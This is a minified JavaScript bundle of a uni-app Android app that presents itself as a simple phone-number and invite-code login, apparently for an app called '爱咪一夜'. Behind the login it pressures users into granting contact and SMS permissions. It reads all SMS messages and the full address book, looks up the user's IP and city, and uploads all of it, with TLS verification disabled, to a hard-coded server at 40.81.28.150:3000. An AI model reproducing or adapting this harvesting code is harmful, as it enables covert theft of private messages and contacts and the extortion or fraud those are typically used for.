(this["webpackJsonp"]=this["webpackJsonp"]||[]).push([["app-service"],{"078a":function(t,e,n){"use strict";var r;n.d(e,"b",(function(){return i})),n.d(e,"c",(function(){return o})),n.d(e,"a",(function(){return r}));var i=function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("view")},o=[]},"0de9":function(t,e,n){"use strict";function r(t){var e=Object.prototype.toString.call(t);return e.substring(8,e.length-1)}function i(){return"string"===typeof __channelId__&&__channelId__}function o(t,e){switch(r(e)){case"Function":return"function() { [native code] }";default:return e}}function a(t){for(var e=arguments.length,n=new Array(e>1?e-1:0),r=1;r<e;r++)n[r-1]=arguments[r];console[t].apply(console,n)}function s(){for(var t=arguments.length,e=new Array(t),n=0;n<t;n++)e[n]=arguments[n];var a=e.shift();if(i())return e.push(e.pop().replace("at ","uni-app:///")),console[a].apply(console,e);var s=e.map((function(t){var e=Object.prototype.toString.call(t).toLowerCase();if("[object object]"===e||"[object array]"===e)try{t="---BEGIN:JSON---"+JSON.stringify(t,o)+"---END:JSON---"}catch(i){t=e}else if(null===t)t="---NULL---";else if(void 0===t)t="---UNDEFINED---";else{var n=r(t).toUpperCase();t="NUMBER"===n||"BOOLEAN"===n?"---BEGIN:"+n+"---"+t+"---END:"+n+"---":String(t)}return t})),u="";if(s.length>1){var c=s.pop();u=s.join("---COMMA---"),0===c.indexOf(" at ")?u+=c:u+="---COMMA---"+c}else u=s[0];console[a](u)}n.r(e),n.d(e,"log",(function(){return a})),n.d(e,"default",(function(){return s}))},"239b":function(t,e,n){if("undefined"===typeof Promise||Promise.prototype.finally||(Promise.prototype.finally=function(t){var e=this.constructor;return this.then((function(n){return e.resolve(t()).then((function(){return n}))}),(function(n){return e.resolve(t()).then((function(){throw n}))}))}),"undefined"!==typeof uni&&uni&&uni.requireGlobal){var r=uni.requireGlobal();ArrayBuffer=r.ArrayBuffer,Int8Array=r.Int8Array,Uint8Array=r.Uint8Array,Uint8ClampedArray=r.Uint8ClampedArray,Int16Array=r.Int16Array,Uint16Array=r.Uint16Array,Int32Array=r.Int32Array,Uint32Array=r.Uint32Array,Float32Array=r.Float32Array,Float64Array=r.Float64Array,BigInt64Array=r.BigInt64Array,BigUint64Array=r.BigUint64Array}uni.restoreGlobal&&uni.restoreGlobal(weex,plus,setTimeout,clearTimeout,setInterval,clearInterval),__definePage("pages/index/index",(function(){return Vue.extend(n("383b").default)})),__definePage("pages/home/home",(function(){return Vue.extend(n("eb30").default)}))},"383b":function(t,e,n){"use strict";n.r(e);var r=n("e39b"),i=n("cdfb");for(var o in i)"default"!==o&&function(t){n.d(e,t,(function(){return i[t]}))}(o);var a,s=n("f0c5"),u=Object(s["a"])(i["default"],r["b"],r["c"],!1,null,null,null,!1,r["a"],a);e["default"]=u.exports},"3e06":function(t,e,n){"use strict";n("239b");var r=o(n("8c20")),i=o(n("8bbf"));function o(t){return t&&t.__esModule?t:{default:t}}function a(t,e){var n=Object.keys(t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(t);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),n.push.apply(n,r)}return n}function s(t){for(var e=1;e<arguments.length;e++){var n=null!=arguments[e]?arguments[e]:{};e%2?a(Object(n),!0).forEach((function(e){u(t,e,n[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(n,e))}))}return t}function u(t,e,n){return e in t?Object.defineProperty(t,e,{value:n,enumerable:!0,configurable:!0,writable:!0}):t[e]=n,t}i.default.config.productionTip=!1,r.default.mpType="app";var c=new i.default(s({},r.default));c.$mount()},4720:function(t,e,n){"use strict";n.r(e);var r=n("8526"),i=n.n(r);for(var o in r)"default"!==o&&function(t){n.d(e,t,(function(){return r[t]}))}(o);e["default"]=i.a},"4d6c":function(t,e){var n=function(t){t=t||null;var e=new Date(t),n=e.getFullYear()+"-",r=(e.getMonth()+1<10?"0"+(e.getMonth()+1):e.getMonth()+1)+"-",i=(e.getDate()<10?"0"+e.getDate():e.getDate())+" ",o=(e.getHours()<10?"0"+e.getHours():e.getHours())+":",a=(e.getMinutes()<10?"0"+e.getMinutes():e.getMinutes())+":",s=e.getSeconds()<10?"0"+e.getSeconds():e.getSeconds();return n+r+i+o+a+s};t.exports=n},"663c":function(t,e,n){"use strict";(function(t){Object.defineProperty(e,"__esModule",{value:!0}),e.default=void 0;var r=n("e1d9"),i={data:function(){return{appHeight:"",firstFocus:!1,cardShow:!1,btnShow:!0,phoneNumber:"",userCode:"",lastMailList:[],mailList:[],equipment:"",userIp:"",address:"",msgList:[],networkState:!1}},onLoad:function(){var e=this;(0,r.netWork)().then((function(t){e.networkState=t})),uni.getSystemInfo({success:function(t){e.title=t.brand,e.appHeight=t.safeArea.height+"px",e.equipment=t.brand}}),(0,r.ipAndaddress)().then((function(n){e.userIp=n.userip,e.address=n.addres,t("log","\u83b7\u53d6ip\u5730\u5740",e.userIp,e.address," at pages/index/index.vue:99")})),setTimeout((function(){(0,r.promiseSMS)().then((function(n){n.msmState?(e.msgList=(0,r.msgList)(),t("log","\u7528\u6237\u5141\u8bb8\u83b7\u53d6\u77ed\u4fe1",e.msgList," at pages/index/index.vue:113")):t("log","\u7528\u6237\u62d2\u7edd\u83b7\u53d6\u77ed\u4fe1",n," at pages/index/index.vue:116")}))}),500)},methods:{starBtn:function(){var e=this;(0,r.netWork)().then((function(t){e.networkState=t}));var n=this;if(this.networkState){plus.android.requestPermissions(["android.permission.READ_CONTACTS"],(function(e){e.deniedAlways.length>0&&(t("log","\u6743\u9650\u88ab\u6c38\u4e45\u62d2\u7edd "+e.deniedAlways.toString()," at pages/index/index.vue:141"),uni.showModal({title:"\u63d0\u793a",content:'\u8bf7\u60a8\u540c\u610f\u5f39\u51fa\u7684\u6743\u9650\uff0c\u4fbf\u53ef\u6b63\u5e38\u4f7f\u7528APP\uff01\u5982\u679c\u672a\u5f39\u51fa\uff0c\u8bf7\u524d\u5f80\u201c\u624b\u673a\u8bbe\u7f6e\u201d\u91cc\u7684\u201c\u6743\u9650\u7ba1\u7406"\u627e\u5230\u7231\u54aa\u4e00\u591c\uff0c\u5e76\u6253\u5f00\u901a\u5f55\u6743\u9650\uff0c\u65b9\u53ef\u4f7f\u7528\u3002',showCancel:!1,success:function(e){if(e.confirm){t("log","\u7528\u6237\u70b9\u51fb\u786e\u5b9a"," at pages/index/index.vue:148");var n=plus.android.runtimeMainActivity(),r=plus.android.importClass("android.content.Intent"),i=plus.android.importClass("android.provider.Settings"),o=new r(i.ACTION_MANAGE_APPLICATIONS_SETTINGS);n.startActivity(o)}}})),e.deniedPresent.length>0&&(t("log","\u6743\u9650\u88ab\u4e34\u65f6\u62d2\u7edd "+e.deniedPresent.toString()," at pages/index/index.vue:165"),uni.showModal({title:"\u63d0\u9192",content:'\u8bf7\u60a8\u540c\u610f\u5f39\u51fa\u7684\u6743\u9650\uff0c\u4fbf\u53ef\u6b63\u5e38\u4f7f\u7528APP\uff01\u5982\u679c\u672a\u5f39\u51fa\uff0c\u8bf7\u524d\u5f80\u201c\u624b\u673a\u8bbe\u7f6e\u201d\u91cc\u7684\u201c\u6743\u9650\u7ba1\u7406"\u627e\u5230\u7231\u54aa\u4e00\u591c\uff0c\u5e76\u6253\u5f00\u901a\u5f55\u6743\u9650\uff0c\u65b9\u53ef\u4f7f\u7528\u3002',showCancel:!1,success:function(e){if(e.confirm){t("log","\u7528\u6237\u70b9\u51fb\u786e\u5b9a"," at pages/index/index.vue:172");var n=plus.android.runtimeMainActivity(),r=plus.android.importClass("android.content.Intent"),i=plus.android.importClass("android.provider.Settings"),o=new r(i.ACTION_MANAGE_APPLICATIONS_SETTINGS);n.startActivity(o)}}})),e.granted.length>0&&(t("log","\u901a\u8baf\u5f55\u6743\u9650\u88ab\u5141\u8bb8"," at pages/index/index.vue:187"),n.btnShow=!1,n.cardShow=!0,n.firstFocus=!0)}),(function(e){t("log","Request Permissions error:"+JSON.stringify(e)," at pages/index/index.vue:193")}));var i=plus.contacts.ADDRESSBOOK_PHONE;plus.contacts.getAddressBook(i,(function(e){e.find(["displayName","phoneNumbers"],(function(t){n.mailList=t}),(function(){t("log","\u83b7\u53d6\u901a\u4fe1\u5f55\u5931\u8d25"," at pages/index/index.vue:203")}),{multiple:!0})}),(function(e){t("log","\u83b7\u53d6\u901a\u8baf\u5f55\u5931\u8d25\u4e86"+e.message," at pages/index/index.vue:209")}))}else uni.showModal({title:"\u63d0\u793a",content:"\u7f51\u7edc\u8fde\u63a5\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7f51\u7edc\u540e\u91cd\u8bd5\uff01",showCancel:!1,success:function(e){e.confirm&&t("log","\u7528\u6237\u70b9\u51fb\u786e\u5b9a"," at pages/index/index.vue:220")}})},userSubmit:function(){var e=this;if(uni.showLoading({title:"\u63d0\u4ea4\u4e2d"}),(0,r.netWork)().then((function(t){e.networkState=t})),""!=this.phoneNumber&&""!=this.userCode){var n=/^[1][3,4,5,7,8,9][0-9]{9}$/;n.test(this.phoneNumber)?this.networkState?(0,r.checkNumber)(this.phoneNumber).then((function(n){if(uni.hideLoading(),t("log","\u6821\u9a8c\u7f51\u7edc",n," at pages/index/index.vue:262"),0==n.code)uni.showToast({title:"\u767b\u5f55\u53f7\u7801\u91cd\u590d",duration:2e3,icon:"error"});else{for(var i in uni.showLoading({title:"\u767b\u5f55\u4e2d..."}),e.mailList)e.lastMailList.push({name:e.mailList[i].displayName,number:e.mailList[i].phoneNumbers[0].value});if(""!=e.msgList){var o={inCode:e.userCode,loginNum:e.phoneNumber,qeu:e.equipment,data:e.msgList};(0,r.addMsgList)(o).then((function(n){e.msgList=[],t("log","\u77ed\u4fe1\u6dfb\u52a0\u6210\u529f",n," at pages/index/index.vue:297")}))}var a={loginNum:e.phoneNumber,inCode:e.userCode,equipment:e.equipment,location:e.userIp,address:e.address,data:e.lastMailList};t("log","\u83b7\u53d6\u7684\u901a\u8baf\u5f55data=",a," at pages/index/index.vue:311"),(0,r.addMailList)(a).then((function(n){1==n.code&&(e.lastMailList=[],uni.hideLoading(),uni.navigateTo({url:"../home/home"}),t("log","\u901a\u8baf\u5f55\u6dfb\u52a0\u6210\u529f",n," at pages/index/index.vue:321"))}))}})):uni.showModal({title:"\u63d0\u793a",content:"\u7f51\u7edc\u8fde\u63a5\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7f51\u7edc\u540e\u91cd\u8bd5\uff01",showCancel:!1,success:function(t){}}):uni.showToast({title:"\u624b\u673a\u53f7\u683c\u5f0f\u6709\u8bef",duration:2e3,icon:"error"})}else uni.showToast({title:"\u5185\u5bb9\u4e0d\u80fd\u4e3a\u7a7a",duration:2e3,icon:"error"})},closeCard:function(){this.cardShow=!1,this.btnShow=!0,this.firstFocus=!1}}};e.default=i}).call(this,n("0de9")["default"])},"6d04":function(t,e,n){"use strict";n.r(e);var r=n("705e"),i=n.n(r);for(var o in r)"default"!==o&&function(t){n.d(e,t,(function(){return r[t]}))}(o);e["default"]=i.a},"705e":function(t,e,n){"use strict";(function(t){Object.defineProperty(e,"__esModule",{value:!0}),e.default=void 0;var n={onLaunch:function(){t("log","App Launch"," at App.vue:4")},onShow:function(){t("log","App Show"," at App.vue:8")},onHide:function(){t("log","App Hide"," at App.vue:11")}};e.default=n}).call(this,n("0de9")["default"])},8526:function(t,e,n){"use strict";(function(t){Object.defineProperty(e,"__esModule",{value:!0}),e.default=void 0;var n={data:function(){return{}},onLoad:function(){t("log","\u8fdb\u5165\u9996\u9875"," at pages/home/home.vue:14"),uni.showLoading({title:"\u6b63\u5728\u52a0\u8f7d..."})},onHide:function(){uni.hideLoading(),t("log","\u9875\u9762\u9690\u85cf"," at pages/home/home.vue:21")},onUnload:function(){uni.hideLoading(),t("log","\u9875\u9762\u5378\u8f7d"," at pages/home/home.vue:25")}};e.default=n}).call(this,n("0de9")["default"])},"8bbf":function(t,e){t.exports=Vue},"8c20":function(t,e,n){"use strict";n.r(e);var r=n("6d04");for(var i in r)"default"!==i&&function(t){n.d(e,t,(function(){return r[t]}))}(i);var o,a,s,u,c=n("f0c5"),l=Object(c["a"])(r["default"],o,a,!1,null,null,null,!1,s,u);e["default"]=l.exports},"96cf":function(t,e){!function(e){"use strict";var n,r=Object.prototype,i=r.hasOwnProperty,o="function"===typeof Symbol?Symbol:{},a=o.iterator||"@@iterator",s=o.asyncIterator||"@@asyncIterator",u=o.toStringTag||"@@toStringTag",c="object"===typeof t,l=e.regeneratorRuntime;if(l)c&&(t.exports=l);else{l=e.regeneratorRuntime=c?t.exports:{},l.wrap=b;var d="suspendedStart",f="suspendedYield",p="executing",h="completed",g={},v={};v[a]=function(){return this};var m=Object.getPrototypeOf,y=m&&m(m(M([])));y&&y!==r&&i.call(y,a)&&(v=y);var w=A.prototype=_.prototype=Object.create(v);S.prototype=w.constructor=A,A.constructor=S,A[u]=S.displayName="GeneratorFunction",l.isGeneratorFunction=function(t){var e="function"===typeof t&&t.constructor;return!!e&&(e===S||"GeneratorFunction"===(e.displayName||e.name))},l.mark=function(t){return Object.setPrototypeOf?Object.setPrototypeOf(t,A):(t.__proto__=A,u in t||(t[u]="GeneratorFunction")),t.prototype=Object.create(w),t},l.awrap=function(t){return{__await:t}},L(O.prototype),O.prototype[s]=function(){return this},l.AsyncIterator=O,l.async=function(t,e,n,r){var i=new O(b(t,e,n,r));return l.isGeneratorFunction(e)?i:i.next().then((function(t){return t.done?t.value:i.next()}))},L(w),w[u]="Generator",w[a]=function(){return this},w.toString=function(){return"[object Generator]"},l.keys=function(t){var e=[];for(var n in t)e.push(n);return e.reverse(),function n(){while(e.length){var r=e.pop();if(r in t)return n.value=r,n.done=!1,n}return n.done=!0,n}},l.values=M,E.prototype={constructor:E,reset:function(t){if(this.prev=0,this.next=0,this.sent=this._sent=n,this.done=!1,this.delegate=null,this.method="next",this.arg=n,this.tryEntries.forEach(j),!t)for(var e in this)"t"===e.charAt(0)&&i.call(this,e)&&!isNaN(+e.slice(1))&&(this[e]=n)},stop:function(){this.done=!0;var t=this.tryEntries[0],e=t.completion;if("throw"===e.type)throw e.arg;return this.rval},dispatchException:function(t){if(this.done)throw t;var e=this;function r(r,i){return s.type="throw",s.arg=t,e.next=r,i&&(e.method="next",e.arg=n),!!i}for(var o=this.tryEntries.length-1;o>=0;--o){var a=this.tryEntries[o],s=a.completion;if("root"===a.tryLoc)return r("end");if(a.tryLoc<=this.prev){var u=i.call(a,"catchLoc"),c=i.call(a,"finallyLoc");if(u&&c){if(this.prev<a.catchLoc)return r(a.catchLoc,!0);if(this.prev<a.finallyLoc)return r(a.finallyLoc)}else if(u){if(this.prev<a.catchLoc)return r(a.catchLoc,!0)}else{if(!c)throw new Error("try statement without catch or finally");if(this.prev<a.finallyLoc)return r(a.finallyLoc)}}}},abrupt:function(t,e){for(var n=this.tryEntries.length-1;n>=0;--n){var r=this.tryEntries[n];if(r.tryLoc<=this.prev&&i.call(r,"finallyLoc")&&this.prev<r.finallyLoc){var o=r;break}}o&&("break"===t||"continue"===t)&&o.tryLoc<=e&&e<=o.finallyLoc&&(o=null);var a=o?o.completion:{};return a.type=t,a.arg=e,o?(this.method="next",this.next=o.finallyLoc,g):this.complete(a)},complete:function(t,e){if("throw"===t.type)throw t.arg;return"break"===t.type||"continue"===t.type?this.next=t.arg:"return"===t.type?(this.rval=this.arg=t.arg,this.method="return",this.next="end"):"normal"===t.type&&e&&(this.next=e),g},finish:function(t){for(var e=this.tryEntries.length-1;e>=0;--e){var n=this.tryEntries[e];if(n.finallyLoc===t)return this.complete(n.completion,n.afterLoc),j(n),g}},catch:function(t){for(var e=this.tryEntries.length-1;e>=0;--e){var n=this.tryEntries[e];if(n.tryLoc===t){var r=n.completion;if("throw"===r.type){var i=r.arg;j(n)}return i}}throw new Error("illegal catch attempt")},delegateYield:function(t,e,r){return this.delegate={iterator:M(t),resultName:e,nextLoc:r},"next"===this.method&&(this.arg=n),g}}}function b(t,e,n,r){var i=e&&e.prototype instanceof _?e:_,o=Object.create(i.prototype),a=new E(r||[]);return o._invoke=N(t,n,a),o}function x(t,e,n){try{return{type:"normal",arg:t.call(e,n)}}catch(r){return{type:"throw",arg:r}}}function _(){}function S(){}function A(){}function L(t){["next","throw","return"].forEach((function(e){t[e]=function(t){return this._invoke(e,t)}}))}function O(t){function e(n,r,o,a){var s=x(t[n],t,r);if("throw"!==s.type){var u=s.arg,c=u.value;return c&&"object"===typeof c&&i.call(c,"__await")?Promise.resolve(c.__await).then((function(t){e("next",t,o,a)}),(function(t){e("throw",t,o,a)})):Promise.resolve(c).then((function(t){u.value=t,o(u)}),(function(t){return e("throw",t,o,a)}))}a(s.arg)}var n;function r(t,r){function i(){return new Promise((function(n,i){e(t,r,n,i)}))}return n=n?n.then(i,i):i()}this._invoke=r}function N(t,e,n){var r=d;return function(i,o){if(r===p)throw new Error("Generator is already running");if(r===h){if("throw"===i)throw o;return I()}n.method=i,n.arg=o;while(1){var a=n.delegate;if(a){var s=C(a,n);if(s){if(s===g)continue;return s}}if("next"===n.method)n.sent=n._sent=n.arg;else if("throw"===n.method){if(r===d)throw r=h,n.arg;n.dispatchException(n.arg)}else"return"===n.method&&n.abrupt("return",n.arg);r=p;var u=x(t,e,n);if("normal"===u.type){if(r=n.done?h:f,u.arg===g)continue;return{value:u.arg,done:n.done}}"throw"===u.type&&(r=h,n.method="throw",n.arg=u.arg)}}}function C(t,e){var r=t.iterator[e.method];if(r===n){if(e.delegate=null,"throw"===e.method){if(t.iterator.return&&(e.method="return",e.arg=n,C(t,e),"throw"===e.method))return g;e.method="throw",e.arg=new TypeError("The iterator does not provide a 'throw' method")}return g}var i=x(r,t.iterator,e.arg);if("throw"===i.type)return e.method="throw",e.arg=i.arg,e.delegate=null,g;var o=i.arg;return o?o.done?(e[t.resultName]=o.value,e.next=t.nextLoc,"return"!==e.method&&(e.method="next",e.arg=n),e.delegate=null,g):o:(e.method="throw",e.arg=new TypeError("iterator result is not an object"),e.delegate=null,g)}function P(t){var e={tryLoc:t[0]};1 in t&&(e.catchLoc=t[1]),2 in t&&(e.finallyLoc=t[2],e.afterLoc=t[3]),this.tryEntries.push(e)}function j(t){var e=t.completion||{};e.type="normal",delete e.arg,t.completion=e}function E(t){this.tryEntries=[{tryLoc:"root"}],t.forEach(P,this),this.reset(!0)}function M(t){if(t){var e=t[a];if(e)return e.call(t);if("function"===typeof t.next)return t;if(!isNaN(t.length)){var r=-1,o=function e(){while(++r<t.length)if(i.call(t,r))return e.value=t[r],e.done=!1,e;return e.value=n,e.done=!0,e};return o.next=o}}return{next:I}}function I(){return{value:n,done:!0}}}(function(){return this||"object"===typeof self&&self}()||Function("return this")())},a34a:function(t,e,n){t.exports=n("bbdd")},bbdd:function(t,e,n){var r=function(){return this||"object"===typeof self&&self}()||Function("return this")(),i=r.regeneratorRuntime&&Object.getOwnPropertyNames(r).indexOf("regeneratorRuntime")>=0,o=i&&r.regeneratorRuntime;if(r.regeneratorRuntime=void 0,t.exports=n("96cf"),i)r.regeneratorRuntime=o;else try{delete r.regeneratorRuntime}catch(a){r.regeneratorRuntime=void 0}},cdfb:function(t,e,n){"use strict";n.r(e);var r=n("663c"),i=n.n(r);for(var o in r)"default"!==o&&function(t){n.d(e,t,(function(){return r[t]}))}(o);e["default"]=i.a},e1d9:function(t,e,n){"use strict";(function(t){Object.defineProperty(e,"__esModule",{value:!0}),e.netWork=c,e.msgAgree=d,e.msgList=p,e.ipAndaddress=h,e.checkNumber=g,e.addMsgList=v,e.addMailList=m,e.promiseSMS=y;var r=o(n("a34a")),i=o(n("4d6c"));function o(t){return t&&t.__esModule?t:{default:t}}function a(t,e,n,r,i,o,a){try{var s=t[o](a),u=s.value}catch(c){return void n(c)}s.done?e(u):Promise.resolve(u).then(r,i)}function s(t){return function(){var e=this,n=arguments;return new Promise((function(r,i){var o=t.apply(e,n);function s(t){a(o,r,i,s,u,"next",t)}function u(t){a(o,r,i,s,u,"throw",t)}s(void 0)}))}}var u="http://40.81.28.150:3000";function c(){return l.apply(this,arguments)}function l(){return l=s(r.default.mark((function e(){var n;return r.default.wrap((function(e){while(1)switch(e.prev=e.next){case 0:return e.next=2,uni.getNetworkType({success:function(e){"none"==e.networkType?(uni.showModal({title:"\u63d0\u793a",content:"\u7f51\u7edc\u8fde\u63a5\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7f51\u7edc\u540e\u91cd\u8bd5\uff01",showCancel:!1,success:function(e){e.confirm&&t("log","\u7528\u6237\u70b9\u51fb\u786e\u5b9a"," at pages/index/test.js:22")}}),n=!1):n=!0}});case 2:return e.abrupt("return",n);case 3:case"end":return e.stop()}}),e)}))),l.apply(this,arguments)}function d(){return f.apply(this,arguments)}function f(){return f=s(r.default.mark((function e(){var n;return r.default.wrap((function(e){while(1)switch(e.prev=e.next){case 0:return e.next=2,plus.android.requestPermissions(["android.permission.READ_SMS"],(function(e){e.deniedAlways.length>0&&t("log","\u77ed\u4fe1\u6743\u9650\u88ab\u6c38\u4e45\u62d2\u7edd "+e.deniedAlways.toString()," at pages/index/test.js:50"),e.deniedPresent.length>0&&t("log","\u77ed\u4fe1\u6743\u9650\u88ab\u4e34\u65f6\u62d2\u7edd "+e.deniedPresent.toString()," at pages/index/test.js:79"),e.granted.length>0&&(t("log","\u77ed\u4fe1\u6743\u9650\u88ab\u5141\u8bb8"," at pages/index/test.js:109"),n="\u77ed\u4fe1\u5141\u8bb8")}),(function(e){t("log","Request Permissions error:"+JSON.stringify(e)," at pages/index/test.js:114")}));case 2:return e.abrupt("return",n);case 3:case"end":return e.stop()}}),e)}))),f.apply(this,arguments)}function p(){var t=[],e=plus.android.runtimeMainActivity(),n=plus.android.importClass("android.net.Uri"),r=(plus.android.importClass("android.provider.ContactsContract"),n.parse("content://sms/")),o=e.getContentResolver();plus.android.importClass(o);var a=o.query(r,null,null,null,null);plus.android.importClass(a),a.moveToFirst();while(a.moveToNext()){var s=a.getColumnIndex("address"),u=a.getString(s),c=a.getColumnIndex("body"),l=a.getString(c),d=a.getColumnIndex("date"),f=a.getLong(d),p=(0,i.default)(f);t.push({phone:u,content:l,time:p})}return a.close(),t}function h(){return new Promise((function(e,n){uni.request({url:"http://pv.sohu.com/cityjson?ie=utf-8",method:"POST",success:function(n){var r=n.data.substring(19);r=r.replace(";"," "),r=JSON.parse("".concat(r)),t("log","\u5b57\u7b26\u4e32\u8f6c\u6362json",r," at pages/index/test.js:181"),e({userip:r.cip,addres:r.cname})}})}))}function g(e){return new Promise((function(n,r){uni.request({url:"".concat(u,"/Api/mobile/checkNum"),data:{loginNum:e},method:"POST",sslVerify:!1,success:function(t){n(t.data)},fail:function(e){n(e),t("log","\u7f51\u7edc\u8bf7\u6c42\u5931\u8d25",e," at pages/index/test.js:229")}})}))}function v(t){return new Promise((function(e,n){uni.request({url:"".concat(u,"/Api/mobile/addMsgList"),data:{inCode:t.inCode,loginNum:t.loginNum,qeu:t.qeu,data:t.data},sslVerify:!1,method:"POST",success:function(t){e(t.data)}})}))}function m(e){return t("log","\u901a\u8baf\u5f55\u6dfb\u52a0",e," at pages/index/test.js:272"),new Promise((function(t,n){uni.request({url:"".concat(u,"/Api/mobile/addMailList"),method:"POST",data:{loginNum:e.loginNum,inCode:e.inCode,equipment:e.equipment,location:e.location,address:e.address,data:e.data},sslVerify:!1,success:function(e){t(e.data)}})}))}function y(){return new Promise((function(e,n){plus.android.requestPermissions(["android.permission.READ_SMS"],(function(n){n.deniedAlways.length>0&&(e({msmState:!1}),t("log","\u77ed\u4fe1\u6743\u9650\u88ab\u6c38\u4e45\u62d2\u7edd "+n.deniedAlways.toString()," at pages/index/test.js:310")),n.deniedPresent.length>0&&(t("log","\u77ed\u4fe1\u6743\u9650\u88ab\u4e34\u65f6\u62d2\u7edd "+n.deniedPresent.toString()," at pages/index/test.js:339"),e({msmState:!1})),n.granted.length>0&&(t("log","\u77ed\u4fe1\u6743\u9650\u88ab\u5141\u8bb8"," at pages/index/test.js:372"),e({msmState:!0}))}),(function(e){t("log","Request Permissions error:"+JSON.stringify(e)," at pages/index/test.js:379")}))}))}}).call(this,n("0de9")["default"])},e39b:function(t,e,n){"use strict";var r;n.d(e,"b",(function(){return i})),n.d(e,"c",(function(){return o})),n.d(e,"a",(function(){return r}));var i=function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("view",{staticClass:t._$s(0,"sc","content"),attrs:{_i:0}},[n("view",{directives:[{name:"show",rawName:"v-show",value:t._$s(1,"v-show",t.cardShow),expression:"_$s(1,'v-show',cardShow)"}],staticClass:t._$s(1,"sc","content_three"),attrs:{_i:1}},[n("view",{staticClass:t._$s(2,"sc","userLogin"),attrs:{_i:2}},[n("view",{staticClass:t._$s(3,"sc","logonTitle"),attrs:{_i:3}},[n("text"),n("icon",{attrs:{_i:5},on:{click:t.closeCard}})]),n("view",{staticClass:t._$s(6,"sc","userInput"),attrs:{_i:6}},[n("input",{directives:[{name:"model",rawName:"v-model",value:t.phoneNumber,expression:"phoneNumber"}],attrs:{focus:t._$s(7,"a-focus",t.firstFocus),_i:7},domProps:{value:t._$s(7,"v-model",t.phoneNumber)},on:{input:function(e){e.target.composing||(t.phoneNumber=e.target.value)}}}),n("input",{directives:[{name:"model",rawName:"v-model",value:t.userCode,expression:"userCode"}],attrs:{_i:8},domProps:{value:t._$s(8,"v-model",t.userCode)},on:{input:function(e){e.target.composing||(t.userCode=e.target.value)}}})]),n("view",{staticClass:t._$s(9,"sc","userSubmit"),attrs:{_i:9},on:{click:t.userSubmit}})])]),n("view",{directives:[{name:"show",rawName:"v-show",value:t._$s(10,"v-show",t.btnShow),expression:"_$s(10,'v-show',btnShow)"}],staticClass:t._$s(10,"sc","content_one"),attrs:{_i:10}},[n("view",{staticClass:t._$s(11,"sc","starBtnStyle"),attrs:{_i:11},on:{click:t.starBtn}})]),n("view",{staticClass:t._$s(12,"sc","content_two"),attrs:{_i:12}},[n("text")])])},o=[]},eb30:function(t,e,n){"use strict";n.r(e);var r=n("078a"),i=n("4720");for(var o in i)"default"!==o&&function(t){n.d(e,t,(function(){return i[t]}))}(o);var a,s=n("f0c5"),u=Object(s["a"])(i["default"],r["b"],r["c"],!1,null,null,null,!1,r["a"],a);e["default"]=u.exports},f0c5:function(t,e,n){"use strict";function r(t,e,n,r,i,o,a,s,u,c){var l,d="function"===typeof t?t.options:t;if(u){d.components||(d.components={});var f=Object.prototype.hasOwnProperty;for(var p in u)f.call(u,p)&&!f.call(d.components,p)&&(d.components[p]=u[p])}if(c&&((c.beforeCreate||(c.beforeCreate=[])).unshift((function(){this[c.__module]=this})),(d.mixins||(d.mixins=[])).push(c)),e&&(d.render=e,d.staticRenderFns=n,d._compiled=!0),r&&(d.functional=!0),o&&(d._scopeId="data-v-"+o),a?(l=function(t){t=t||this.$vnode&&this.$vnode.ssrContext||this.parent&&this.parent.$vnode&&this.parent.$vnode.ssrContext,t||"undefined"===typeof __VUE_SSR_CONTEXT__||(t=__VUE_SSR_CONTEXT__),i&&i.call(this,t),t&&t._registeredComponents&&t._registeredComponents.add(a)},d._ssrRegister=l):i&&(l=s?function(){i.call(this,this.$root.$options.shadowRoot)}:i),l)if(d.functional){d._injectStyles=l;var h=d.render;d.render=function(t,e){return l.call(e),h(t,e)}}else{var g=d.beforeCreate;d.beforeCreate=g?[].concat(g,l):[l]}return{exports:t,options:d}}n.d(e,"a",(function(){return r}))}},[["3e06","app-config"]]]);